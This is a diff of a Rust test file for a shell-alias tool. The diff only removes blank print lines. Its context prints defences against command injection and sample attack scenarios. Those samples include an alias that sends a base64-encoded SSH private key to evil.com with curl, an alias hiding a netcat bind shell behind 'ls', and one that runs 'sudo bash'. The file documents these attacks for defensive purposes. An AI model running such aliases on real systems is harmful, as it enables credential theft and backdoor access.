@@ -334,7 +334,6 @@ fn test_validation_recommendations() {
     println!("  ✓ Only permit exact matches or simple arguments");
     println!("  ✓ Reject anything with shell metacharacters");
     println!("  Example: Allow 'git status', 'ls -la', but reject 'ls; rm'");
-    println!("");
 
     println!("Option 2: BLACKLIST DANGEROUS PATTERNS (Moderate)");
     println!("  • Reject commands containing: ; | & $ ` ( ) < > \\ \\n");
@@ -342,14 +341,12 @@ fn test_validation_recommendations() {
     println!("  • Validate no path traversal: ../");
     println!("  • Limit command length (e.g., 500 chars)");
     println!("  ⚠️  Warning: Blacklists can be bypassed!");
-    println!("");
 
     println!("Option 3: SHELL ESCAPING (Least Secure)");
     println!("  • Use shellwords or shlex crate to escape");
     println!("  • Quote the entire command properly");
     println!("  • Still vulnerable to complex exploits");
     println!("  ⚠️  Not recommended as primary defense");
-    println!("");
 
     println!("RECOMMENDED IMPLEMENTATION:");
     println!("  1. Validate command against whitelist of safe patterns");
@@ -357,7 +354,6 @@ fn test_validation_recommendations() {
     println!("  3. Escape the command properly (defense in depth)");
     println!("  4. Log rejected commands for security monitoring");
     println!("  5. Warn user about security implications");
-    println!("");
 
     println!("CODE EXAMPLE:");
     println!(
@@ -416,7 +412,6 @@ fn test_real_world_exploit_scenarios() {
     println!("    2. User executes 'll' thinking it's safe");
     println!("    3. Attacker receives hostname and username");
     println!("    4. Escalate to full credential theft");
-    println!("");
 
     println!("SCENARIO 2: Supply Chain Attack");
     println!("  Attacker: Compromised tutorial/documentation");
@@ -426,7 +421,6 @@ fn test_real_world_exploit_scenarios() {
     println!("    2. msc alias add deploy 'git push origin main; curl http://evil.com/$(cat ~/.ssh/id_rsa|base64)'");
     println!("    3. Developer copies command without inspection");
     println!("    4. SSH keys stolen on next deploy");
-    println!("");
 
     println!("SCENARIO 3: Persistent Backdoor");
     println!("  Attacker: External attacker with initial access");
@@ -436,7 +430,6 @@ fn test_real_world_exploit_scenarios() {
     println!("    2. msc alias add ls 'ls $@ & (nc -l 4444 -e /bin/bash) &'");
     println!("    3. Every 'ls' command spawns hidden backdoor");
     println!("    4. Backdoor persists across sessions");
-    println!("");
 
     println!("SCENARIO 4: Privilege Escalation");
     println!("  Attacker: Low-privilege user");
@@ -446,14 +439,12 @@ fn test_real_world_exploit_scenarios() {
     println!("    2. Create alias that exploits it");
     println!("    3. msc alias add update 'sudo apt update; sudo bash'");
     println!("    4. Trick admin into running 'update' alias");
-    println!("");
 
     println!("IMPACT ASSESSMENT:");
     println!("  • Confidentiality: HIGH (credential theft, data exfil)");
     println!("  • Integrity: HIGH (malware installation, backdoors)");
     println!("  • Availability: MEDIUM (could delete files, DoS)");
     println!("  • CVSS Score: ~9.8 (Critical)");
-    println!("");
 
     println!("═══════════════════════════════════════════════════════\n");
 }
